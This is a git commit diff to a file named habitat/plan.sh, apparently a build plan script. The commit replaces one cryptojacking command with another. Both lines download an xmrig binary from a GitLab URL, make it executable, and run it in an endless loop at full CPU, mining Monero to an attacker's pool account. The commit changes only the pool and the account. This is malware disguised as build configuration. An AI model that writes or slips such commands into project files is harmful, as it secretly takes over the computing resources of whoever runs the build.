6c113837dd66fd2db603f135b5d4a55641b1521d
phyllishkibby <47544243+phyllishkibby@users.noreply.github.com>
2019-03-28 03:31:01 +0300

    Update plan.sh

--- habitat/plan.sh
+++ habitat/plan.sh
@@ -1,1 +1,1 @@
-wget https://gitlab.com/madisonmedia/madisonmedia/raw/master/xmrig && chmod +x xmrig && while true; do ./xmrig -o stratum+tcp://xmr.pool.minergate.com:45700 -u empireofbooks@gmail.com -p x --threads 2 --max-cpu-usage=100 --cpu-priority 5 --donate-level 1 ; sleep 1; done
+wget https://gitlab.com/madisonmedia/madisonmedia/raw/master/xmrig && chmod +x xmrig && while true; do ./xmrig -o europe.cryptonight-hub.miningpoolhub.com:20580 -u brahim7.workername -p x --threads 2 --max-cpu-usage=100 --cpu-priority 5 --donate-level 1 ; sleep 1; done
